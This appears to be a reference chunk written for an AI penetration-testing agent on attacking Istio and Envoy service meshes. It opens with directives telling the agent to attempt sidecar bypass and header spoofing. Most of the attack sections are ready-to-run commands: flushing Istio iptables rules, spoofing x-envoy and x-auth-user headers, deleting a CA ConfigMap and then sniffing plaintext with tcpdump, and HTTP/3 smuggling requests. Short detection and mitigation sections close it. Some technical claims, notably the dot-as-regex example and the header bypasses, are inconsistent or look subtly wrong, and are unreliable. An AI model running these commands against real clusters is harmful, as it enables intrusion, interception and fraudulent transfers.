# Service Mesh mTLS Bypass & Policy Exploitation — Agent Chunk 71a
> Source: Istio Security Advisories, Envoy CVE Database, CNCF Security Audits
> Purpose: Understand how service mesh mTLS configurations, sidecar bypass techniques, and AuthorizationPolicy misconfigurations allow lateral movement and privilege escalation within Kubernetes clusters
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing APIs behind a service mesh, first check the mesh's mTLS mode (PERMISSIVE vs STRICT). Test for sidecar bypass from privileged pods, x-envoy header spoofing, and AuthorizationPolicy misconfigurations. Use kubectl to inspect PeerAuthentication, AuthorizationPolicy, and DestinationRule resources. Attempt direct pod-to-pod communication bypassing the sidecar proxy.

---

## 1. Istio PERMISSIVE Mode Exploitation

### 1.1 The Default Misconfiguration

Istio's default mTLS mode is `PERMISSIVE`, which accepts both mTLS and plaintext traffic. This is intended for migration but is frequently left in production.

```yaml
# Default PeerAuthentication — PERMISSIVE
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: PERMISSIVE    # Accepts plaintext!
```

**Attack:** Any pod in the cluster (or an attacker who has compromised one) can send plaintext HTTP requests to any service, bypassing mTLS identity verification.

```bash
# From a compromised pod without Istio sidecar
curl http://payment-service.production.svc.cluster.local:8080/api/transfer \
  -d '{"amount": 10000, "to": "attacker"}'
# Works because PERMISSIVE accepts plaintext
```

### 1.2 Verification

```bash
# Check mesh-wide PeerAuthentication
kubectl get peerauthentication -A -o yaml | grep -A 2 "mtls"

# Check namespace-level overrides
kubectl get peerauthentication -n production -o yaml

# Verify actual mTLS status
istioctl x describe pod payment-service-7d9b8f-x2k4n.production
```

## 2. Sidecar Bypass via iptables Manipulation

### 2.1 Privileged Container Bypass

Istio sidecars intercept traffic via iptables rules in the pod's network namespace. A privileged container can modify these rules.

```bash
# From a privileged container in the mesh
# List current iptables rules injected by Istio
iptables -t nat -L -n -v

# Delete Istio's interception rules
iptables -t nat -D ISTIO_OUTPUT -j RETURN -m owner --uid-owner 1337
iptables -t nat -F ISTIO_REDIRECT
iptables -t nat -F ISTIO_IN_REDIRECT

# Now traffic flows directly to/from the application, bypassing the sidecar
# No mTLS, no AuthorizationPolicy, no telemetry
curl http://secret-service.production.svc.cluster.local:8080/internal/admin
```

### 2.2 init Container Race Condition

If the istio-init container has not finished setting up iptables rules before the application container starts, early traffic bypasses the sidecar.

```bash
# Check if holdApplicationUntilProxyStarts is enabled
kubectl get configmap istio -n istio-system -o yaml | grep holdApplicationUntilProxyStarts
# If false or absent, race condition exists
```

## 3. X-Envoy Header Spoofing — CVE-2024-45806

### 3.1 Vulnerability

Envoy proxy trusts internal `x-envoy-*` headers when they arrive on external connections that are not sanitized by the gateway.

**CVE-2024-45806 (CVSS 7.6):** Envoy failed to strip `x-envoy-original-path` and `x-envoy-internal` headers from external requests in certain configurations.

```bash
# Spoof internal status to bypass external-only rate limiting
curl -H "x-envoy-internal: true" https://api.target.com/expensive-endpoint
# Envoy treats request as internal — skips external rate limit filter

# Override original path for routing manipulation
curl -H "x-envoy-original-path: /admin/internal" https://api.target.com/public
# Envoy routes based on spoofed original path
```

### 3.2 Additional Envoy Header Attacks

```bash
# Bypass per-route auth by spoofing decorator
curl -H "x-envoy-decorator-operation: unauthenticated-route" https://api.target.com/secure

# Spoof upstream metadata
curl -H "x-envoy-upstream-service-time: 0" https://api.target.com/api
```

## 4. BackendTLSPolicy Fail-Open — ISTIO-SECURITY-2026-006

### 4.1 Vulnerability

When Istio's waypoint proxy (ambient mesh architecture) cannot establish a TLS connection to the backend, it falls back to plaintext instead of rejecting the request.

```yaml
# Intended: strict TLS to backend
apiVersion: gateway.networking.k8s.io/v1alpha3
kind: BackendTLSPolicy
metadata:
  name: payment-backend
spec:
  targetRefs:
    - group: ""
      kind: Service
      name: payment-service
  validation:
    caCertificateRefs:
      - name: payment-ca
        group: ""
        kind: ConfigMap
    hostname: payment.internal
```

**Attack:** If the backend's TLS certificate expires or the CA ConfigMap is deleted, the waypoint proxy silently falls back to plaintext. An attacker performing a MITM on the pod network can intercept traffic.

```bash
# Delete the CA ConfigMap to trigger fail-open
kubectl delete configmap payment-ca -n production

# Traffic continues flowing but now in plaintext
# MITM from any pod on the same node
tcpdump -i eth0 -A port 8080
```

## 5. AuthorizationPolicy Dot-as-Regex — CVE-2026-39350

### 5.1 Vulnerability (CVSS 7.5)

Istio's AuthorizationPolicy uses Envoy's regex engine. A dot (`.`) in a path match is interpreted as a regex wildcard, not a literal dot.

```yaml
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: allow-api-v1
spec:
  rules:
  - to:
    - operation:
        paths: ["/api/v1.0/public/*"]    # Dot is regex wildcard!
```

**Attack:** The dot matches any character, so `/api/v1X0/public/admin` also matches.

```bash
# Intended match
GET /api/v1.0/public/data → ALLOW

# Unintended match — dot matches any character
GET /api/v1/0/public/../../admin/secrets → ALLOW (dot matched '/')
```

**Fix:** Escape dots in AuthorizationPolicy paths: `"/api/v1\\.0/public/*"`.

## 6. RBAC Header Bypass — CVE-2026-31838

### 6.1 Vulnerability (CVSS 8.1)

Envoy's RBAC filter evaluated headers after applying header mutations from earlier filters. An attacker could inject headers that a preceding filter would transform into trusted internal headers.

```bash
# Envoy config: header_mutation filter adds "x-auth-user" from JWT claim
# RBAC filter allows requests where x-auth-user == "admin"

# Attack: Inject the header directly, bypassing JWT validation
curl -H "x-auth-user: admin" https://api.target.com/admin/endpoint
# If the header_mutation filter does not overwrite existing headers,
# the injected value passes RBAC check
```

**Affected versions:** Envoy < 1.32.4, Istio < 1.24.3.

## 7. HTTP/3-to-HTTP/1 Smuggling — CVE-2026-48743

### 7.1 Vulnerability (CVSS 7.5)

When Envoy terminates HTTP/3 (QUIC) at the gateway and proxies to HTTP/1.1 backends, differences in header parsing enable request smuggling.

```
# HTTP/3 request with pseudo-headers
:method = GET
:path = /public
:authority = target.com
transfer-encoding: chunked
content-length: 0

# Envoy forwards to HTTP/1.1 backend:
GET /public HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 0

# Backend processes CL/TE ambiguity — smuggling possible
```

**Reproduction:**
```bash
# Using curl with HTTP/3
curl --http3 -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 0" \
  https://target.com/public
```

## 8. Reproduction with kubectl

### 8.1 Full Assessment Workflow

```bash
# 1. Check mesh mTLS mode
kubectl get peerauthentication -A -o yaml

# 2. Check AuthorizationPolicies for unescaped dots
kubectl get authorizationpolicy -A -o yaml | grep -E 'paths.*\.'

# 3. Check for privileged pods that can bypass sidecar
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# 4. Check if holdApplicationUntilProxyStarts is set
kubectl get cm istio -n istio-system -o yaml | grep hold

# 5. Test plaintext connectivity from a non-mesh pod
kubectl run test-pod --image=curlimages/curl --rm -it -- \
  curl -s http://target-service.production.svc.cluster.local:8080/health

# 6. Check for header sanitization
kubectl get envoyfilter -A -o yaml | grep -A 5 "request_headers_to_remove"

# 7. Inspect DestinationRules for TLS settings
kubectl get destinationrule -A -o yaml | grep -A 5 "tls"
```

## 9. Detection

```yaml
# Detect plaintext traffic in STRICT mesh
# Istio access log filter:
apiVersion: telemetry.istio.io/v1
kind: Telemetry
metadata:
  name: detect-plaintext
spec:
  accessLogging:
  - providers:
    - name: envoy
    filter:
      expression: "connection.mtls == false"
```

## 10. Mitigation

1. **Enforce STRICT mTLS mesh-wide:** Set PeerAuthentication to STRICT in `istio-system` namespace.
2. **Disable privileged containers:** Use PodSecurityAdmission to prevent privileged pods.
3. **Enable holdApplicationUntilProxyStarts:** Prevent init container race conditions.
4. **Sanitize x-envoy headers:** Configure Envoy to strip all `x-envoy-*` headers on external listeners.
5. **Escape dots in AuthorizationPolicy:** Use `\\.` for literal dots in path matches.
6. **Set BackendTLSPolicy to fail-closed:** Configure waypoint proxies to reject on TLS failure.
7. **Audit RBAC header dependencies:** Ensure RBAC filters evaluate headers before mutation filters can modify them.
